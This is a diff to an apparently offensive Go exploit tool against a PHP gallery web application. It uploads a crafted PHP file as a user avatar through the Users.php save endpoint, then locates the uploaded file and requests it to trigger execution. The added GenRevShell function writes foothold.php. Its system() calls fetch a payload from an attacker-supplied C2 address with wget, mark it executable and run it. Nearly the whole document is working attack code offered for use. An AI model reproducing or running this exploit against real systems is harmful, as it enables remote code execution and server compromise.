@@ -193,23 +193,53 @@ func (c *Client) CreateMIMEData(userinfo UserInformation, filename string, filew
 		return false, err.Error()
 	}
 
-	contentType := http.DetectContentType(content)
-	if err != nil {
-		return false, err.Error()
-	}
-
 	SysMsgNB("creating file part ...")
 
-	header.Set("Content-Disposition", "form-data; name=\"img\"; filename=\"%s\"")
-	header.Set("Content-Type", contentType)
+	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"img\"; filename=\"%s\"", filename))
+	header.Set("Content-Type", "application/x-php")
 
-	part, err = filewriter.CreatePart(header)
+	part, err = filewriter.CreateFormFile("img", filename)
 	if err != nil {
 		return false, err.Error()
 	}
 	part.Write(content)
 
 	return true, "MIME data created"
+}
+
+func (c *Client) GetAvatar(tgtFile string) (avatarURL string, success bool, message string) {
+	var target string = fmt.Sprintf("%s/gallery/index.php", c.baseURL)
+	var avatarpattern string = fmt.Sprintf("<.*src=.*%s\"", tgtFile)
+
+	resp, err := c.Session.Get(target)
+	if err != nil {
+		return "", false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return "", false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
+	}
+
+	bodyContent, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", false, err.Error()
+	}
+
+	re, err := regexp.Compile(avatarpattern)
+	if err != nil {
+		return "", false, err.Error()
+	}
+
+	matches := re.FindAll(bodyContent, -1)
+
+	if len(matches) < 1 {
+		return "", false, "avatar not found"
+	}
+
+	avatarURL = strings.Replace(strings.Split(string(matches[0]), "src=")[1], "\"", "", -1)
+
+	return avatarURL, true, "avatar filename pulled successfully"
 }
 
 func (c *Client) GetCookies() (success bool, message string) {
@@ -361,13 +391,25 @@ func (c *Client) PullUserInfo() (info UserInformation, success bool, message str
 	return info, true, "user information successfully scraped"
 }
 
+func (c *Client) TriggerShell(avatarURL string) (success bool, message string) {
+	resp, err := c.Session.Get(avatarURL)
+	if err != nil {
+		return false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode >= 400 {
+		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
+	}
+
+	return true, "shell triggered"
+}
+
 func (c *Client) UpdateInfo(userInfo UserInformation, revshell string) (success bool, message string) {
 	var contentBuf *bytes.Buffer = new(bytes.Buffer)
 	var filewriter multipart.Writer = *multipart.NewWriter(contentBuf)
 	const route string = "gallery/classes/Users.php?f=save"
 	var target string = fmt.Sprintf("%s/%s", c.baseURL, route)
-
-	InfMsg(fmt.Sprintf("Update Endpoint: %s", target))
 
 	success, message = c.CreateMIMEData(userInfo, revshell, &filewriter)
 	if !success {
@@ -393,14 +435,13 @@ func (c *Client) UpdateInfo(userInfo UserInformation, revshell string) (success 
 
 func GenRevShell(c2ip string, c2port int, tgtFile string) (success bool, message string) {
 	var c2addr string = fmt.Sprintf("%s:%d", c2ip, c2port)
-	var outfile string = "/tmp/good"
 
 	var format string = "<?php\n%s\n%s\n%s\n?>"
-	var pullFile string = fmt.Sprintf("exec(\"wget http://%s/%s -o %s\");", c2addr, tgtFile, outfile)
-	var markFile string = "exec(\"chmod +x /tmp/good\");"
-	var runFile string = "exec(\"/tmp/good\");"
+	var pullFile string = fmt.Sprintf("system('wget \"http://%s/%s\"');", c2addr, tgtFile)
+	var runfile string = fmt.Sprintf("system('chmod +x %s');", tgtFile)
+	var executeShell string = fmt.Sprintf("system('./%s');", tgtFile)
 
-	format = fmt.Sprintf(format, pullFile, markFile, runFile)
+	format = fmt.Sprintf(format, pullFile, runfile, executeShell)
 
 	fptr, err := os.Create("foothold.php")
 	if err != nil {
@@ -474,7 +515,7 @@ func main() {
 	}
 	client.Session.Jar = clientjar
 
-	success, message = GenRevShell(c2ip, c2port, "malicious")
+	success, message = GenRevShell(c2ip, c2port, malfile)
 	if !success {
 		ErrMsg(message)
 		os.Exit(1)
@@ -495,7 +536,21 @@ func main() {
 	}
 	SucMsg(message)
 
-	success, message = client.UpdateInfo(userInformation, malfile)
+	success, message = client.UpdateInfo(userInformation, "foothold.php")
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(message)
+
+	avatarURL, success, message := client.GetAvatar("foothold.php")
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(message)
+
+	success, message = client.TriggerShell(avatarURL)
 	if !success {
 		ErrMsg(message)
 		os.Exit(1)
